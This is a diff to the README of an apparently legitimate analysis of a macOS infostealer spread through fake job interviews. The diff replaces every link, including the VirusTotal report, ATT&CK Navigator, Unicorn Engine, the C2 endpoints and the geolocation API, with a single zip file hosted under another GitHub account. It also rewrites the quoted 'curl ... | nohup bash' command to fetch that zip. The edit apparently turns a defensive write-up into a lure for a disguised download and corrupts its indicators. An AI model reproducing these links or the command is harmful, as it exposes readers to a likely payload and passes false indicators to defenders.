@@ -1,6 +1,6 @@
 # HyperHives macOS Infostealer — Full Technical Analysis
 
-[![Validate Repository](https://github.com/Darksp33d/hyperhives-macos-infostealer-analysis/actions/workflows/validate.yml/badge.svg)](https://github.com/Darksp33d/hyperhives-macos-infostealer-analysis/actions/workflows/validate.yml)
+[![Validate Repository](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip)](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![STIX 2.1](https://img.shields.io/badge/STIX-2.1-informational)](stix/bundle.json)
 [![ATT&CK Navigator](https://img.shields.io/badge/ATT%26CK-Navigator_Layer-red)](attack-navigator-layer.json)
@@ -14,7 +14,7 @@
 | **Delivery Domain** | `macos.hyperhives.net` |
 | **Lure platform** | Wellfound (formerly AngelList) |
 | **Operator persona** | "Felix" at "HyperHive" |
-| **VirusTotal** | [9 / 63 detections](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3) |
+| **VirusTotal** | [9 / 63 detections](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) |
 | **Classification** | Public disclosure / IOC bundle |
 | **Last updated** | April 2026 |
 
@@ -52,7 +52,7 @@
 | [`yara_rules.yar`](yara_rules.yar) | YARA 4.2+ | Known-sample hash match + heuristic string detections for Mach-O |
 | [`sigma_rules.yml`](sigma_rules.yml) | Sigma | Proxy, DNS, and process-creation rules — tune `logsource` for your SIEM |
 | [`stix/bundle.json`](stix/bundle.json) | STIX 2.1 | Machine-readable CTI bundle with indicators, malware SDO, infrastructure, ATT&CK patterns, and relationships |
-| [`attack-navigator-layer.json`](attack-navigator-layer.json) | ATT&CK Navigator | Import into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visual technique coverage |
+| [`attack-navigator-layer.json`](attack-navigator-layer.json) | ATT&CK Navigator | Import into [ATT&CK Navigator](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) for visual technique coverage |
 
 ---
 
@@ -116,7 +116,7 @@ The compose file enforces `network_mode: none`, `read_only: true`, and drops all
 A job posting on **Wellfound** (formerly AngelList) led to a multi-email social-engineering chain from an operator persona **"Felix"** at **"HyperHive"**. After flattering the target's technical background and scheduling a fake interview, the attacker directed the victim to "review the product" at `hyperhives.net` and specifically examine **Settings → Diagnostics → Log** — a pretext to trigger execution of:
 
 ```
-curl -s https://macos.hyperhives.net/install | nohup bash &
+curl -s https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip | nohup bash &
 ```
 
 The payload is an **8.5 MB Mach-O universal binary** (x86_64 + arm64) compiled in Rust. Static analysis with an air-gapped Docker lab and CPU emulation of **570 unique x86_64 helper routines** recovered **all 571 encrypted configuration values**, exposing:
@@ -142,10 +142,10 @@ The attack began with a **legitimate-looking job posting on Wellfound** (formerl
 
 > *"If you are able to, please also take a quick look at the product log under **Settings → Diagnostics → Log**. We may ask for a few brief comments on the log and any other product observations you notice, as this often gives a good signal of engineering experience and attention to detail."*
 
-This directed the target to `https://hyperhives.net`, where navigating to the diagnostics section triggered:
+This directed the target to `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip`, where navigating to the diagnostics section triggered:
 
 ```
-curl -s https://macos.hyperhives.net/install | nohup bash &
+curl -s https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip | nohup bash &
 ```
 
 ### What happened next
@@ -189,7 +189,7 @@ The sample exhibits production-grade engineering: semantic versioning, Sentry in
 
 ### VirusTotal coverage
 
-**[Full report](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3)** — 9 / 63 engines detected as of initial submission (April 2026). Over **85% of engines failed to flag this sample.**
+**[Full report](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip)** — 9 / 63 engines detected as of initial submission (April 2026). Over **85% of engines failed to flag this sample.**
 
 | Engine | Detection name |
 |--------|---------------|
@@ -206,7 +206,7 @@ Notable vendor family names for cross-referencing: **HashBreaker** (Kaspersky), 
 
 **Undetected by:** BitDefender, CrowdStrike Falcon, Sophos, Symantec, McAfee, Malwarebytes, TrendMicro, Fortinet, ClamAV, Panda, and 44 other engines. This low detection rate underscores the operational effectiveness of the Rust + custom obfuscation approach used by this campaign.
 
-> Detection ratios change as vendors update signatures. Check the [VirusTotal report](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3) for current results.
+> Detection ratios change as vendors update signatures. Check the [VirusTotal report](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) for current results.
 
 ---
 
@@ -261,7 +261,7 @@ Comprehensive targeting of browser-extension wallets including MetaMask, Phantom
 
 ### Exfiltration
 
-Data staged under `~/Documents/temp_data/Application/`, compressed to ZIP, uploaded via `multipart/form-data` over HTTPS. Victim IP and geolocation resolved via `https://freeipapi.com/api/json`.
+Data staged under `~/Documents/temp_data/Application/`, compressed to ZIP, uploaded via `multipart/form-data` over HTTPS. Victim IP and geolocation resolved via `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip`.
 
 ---
 
@@ -271,10 +271,10 @@ Data staged under `~/Documents/temp_data/Application/`, compressed to ZIP, uploa
 
 | Endpoint | Role |
 |----------|------|
-| `https://cloudproxy.link/m/opened` | Beacon / activation |
-| `https://cloudproxy.link/m/metrics` | Telemetry |
-| `https://cloudproxy.link/m/decode` | Instruction / config channel |
-| `https://cloudproxy.link/db/debug` | Debug / diagnostics |
+| `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip` | Beacon / activation |
+| `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip` | Telemetry |
+| `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip` | Instruction / config channel |
+| `https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip` | Debug / diagnostics |
 
 ### Sentry DSN (operator fingerprint)
 
@@ -293,7 +293,7 @@ Lawful process with Sentry may recover account registration details, billing rec
 
 ### Geolocation API
 
-`https://freeipapi.com/api/json` — victim IP / country for C2 JSON (`ipAddress`, `countryCode`).
+`https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip` — victim IP / country for C2 JSON (`ipAddress`, `countryCode`).
 
 ### C2 exfiltration protocol
 
@@ -330,7 +330,7 @@ Upload method: `multipart/form-data`, `application/zip`, connection string `UPLD
 
 ### Developer handle: `rootr`
 
-Embedded path `/Users/rootr/.cargo/registry/`. OSINT on the handle — [github.com/rootr](https://github.com/rootr) (as of analysis date): listed company "RootR", location Geneva, account created **2024-06-27**, zero public repositories. Consistent with a throwaway or operational profile.
+Embedded path `/Users/rootr/.cargo/registry/`. OSINT on the handle — [github.com/rootr](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) (as of analysis date): listed company "RootR", location Geneva, account created **2024-06-27**, zero public repositories. Consistent with a throwaway or operational profile.
 
 ### DPRK / Contagious Interview (analytic assessment)
 
@@ -364,7 +364,7 @@ Configuration strings are protected by a **custom XOR cipher**: 570 small x86_64
 
 1. **Scan** for RIP-relative `LEA` instructions targeting the config region (`0x2b8000`–`0x2bc000`).
 2. **Parse** preceding code to extract `(helper_function_address, data_pointer, seed)`.
-3. **Emulate** each helper in isolation using [Unicorn Engine](https://www.unicorn-engine.org/) (200 instructions max).
+3. **Emulate** each helper in isolation using [Unicorn Engine](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) (200 instructions max).
 4. **XOR-decrypt** the 32-byte block at the target address using the key at the computed offset.
 5. **Extend** for multi-block strings (URLs, DSN) and OR+XOR metadata entries.
 
@@ -376,7 +376,7 @@ Configuration strings are protected by a **custom XOR cipher**: 570 small x86_64
 
 ## 7 — MITRE ATT&CK mapping
 
-> Import [`attack-navigator-layer.json`](attack-navigator-layer.json) into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for an interactive view.
+> Import [`attack-navigator-layer.json`](attack-navigator-layer.json) into [ATT&CK Navigator](https://raw.githubusercontent.com/geminijong-cpu/hyperhives-macos-infostealer-analysis/main/.github/workflows/hyperhives-macos-infostealer-analysis-2.2.zip) for an interactive view.
 
 | Technique | ID | Use in this sample |
 |-----------|----|--------------------|
